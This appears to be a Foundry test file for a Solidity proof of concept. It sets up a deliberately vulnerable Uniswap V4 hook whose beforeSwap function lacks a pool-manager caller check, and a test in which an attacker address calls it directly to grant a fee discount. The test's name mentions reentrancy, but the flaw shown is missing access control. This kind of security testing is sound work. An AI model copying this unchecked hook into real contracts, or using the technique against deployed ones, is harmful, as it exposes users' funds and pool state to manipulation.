// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract VulnerableUniswapV4Hook {
    address public poolManager;
    mapping(address => uint256) public feeDiscount;

    constructor(address _poolManager) {
        poolManager = _poolManager;
    }

    function beforeSwap(
        address /* sender */,
        bytes32 /* poolKey */,
        int256 /* amountSpecified */,
        bytes calldata hookData
    ) external returns (bytes4) {
        if (hookData.length > 0) {
            address beneficiary = abi.decode(hookData, (address));
            feeDiscount[beneficiary] = 10;
        }
        return this.beforeSwap.selector;
    }
}

contract POC_V4Hook_TransientReentrancy is Test {
    address internal attacker = address(0xBAD);
    address internal poolManager = address(0x1111);
    address internal beneficiary = address(0x9999);
    VulnerableUniswapV4Hook internal targetHook;

    function setUp() public {
        targetHook = new VulnerableUniswapV4Hook(poolManager);
        vm.deal(attacker, 10 ether);
    }

    function test_Exploit_UnauthorizedCallerManipulatesHookState() public {
        assertEq(targetHook.feeDiscount(beneficiary), 0, "Initial fee discount must be 0");

        // Attacker directly calls beforeSwap without poolManager privileges
        vm.prank(attacker);
        bytes memory hookData = abi.encode(beneficiary);
        bytes4 selector = targetHook.beforeSwap(attacker, bytes32(0), 1000, hookData);

        assertEq(selector, targetHook.beforeSwap.selector);
        assertEq(targetHook.feeDiscount(beneficiary), 10, "Attacker failed to alter fee discount");
    }

    function test_PoolManagerConfigured() public view {
        assertEq(targetHook.poolManager(), poolManager);
    }
}
